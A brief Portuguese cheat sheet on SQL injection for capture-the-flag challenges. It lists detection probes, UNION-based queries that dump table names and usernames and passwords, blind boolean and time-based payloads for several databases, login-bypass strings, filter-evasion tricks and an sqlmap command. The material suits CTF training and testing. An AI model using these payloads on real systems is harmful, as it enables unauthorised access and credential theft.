# SQL Injection — cheat sheet rápido para CTF

## 1. Descobrir se é vulnerável
```
'          -> erro de sintaxe?
''         -> sem erro = provável escape duplo
" / `      -> se o backend não for MySQL com aspas simples
1 OR 1=1   -> retorna tudo?
1' OR '1'='1
```

## 2. Descobrir número de colunas (UNION)
```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
... (vai subindo até dar erro) -> número de colunas = último que funcionou
```

## 3. UNION based — achar coluna refletida na tela
```sql
' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT 'a','b','c'-- -        (veja qual aparece na página)
```

## 4. Extrair dados (MySQL)
```sql
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables-- -
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT username,password,NULL FROM users-- -
```

## 5. Blind boolean-based
```sql
' AND 1=1-- -      (página normal)
' AND 1=2-- -      (página muda/erro = confirma injeção)
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'-- -
```

## 6. Blind time-based (quando não há diferença visual)
```sql
' AND SLEEP(5)-- -                              (MySQL)
'; WAITFOR DELAY '0:0:5'--                       (MSSQL)
' AND pg_sleep(5)-- -                            (PostgreSQL)
```

## 7. Bypass de login clássico
```sql
admin'-- -
admin' OR '1'='1
' OR 1=1 LIMIT 1-- -
```

## 8. Bypass de filtros comuns
- Espaço bloqueado → usar `/**/` ou `%09` (tab) no lugar
- `OR`/`AND` bloqueado → `||` e `&&` (MySQL), ou variar maiúsc/minúsc: `oR`
- Aspas bloqueadas → usar hex: `0x61646d696e` em vez de `'admin'`
- `UNION` bloqueado → `UNI/**/ON`

## Ferramentas
- sqlmap: `sqlmap -u "URL?id=1" --dbs` (ver `links.md`)
- PayloadsAllTheThings tem listas enormes de payloads prontos por banco de dados
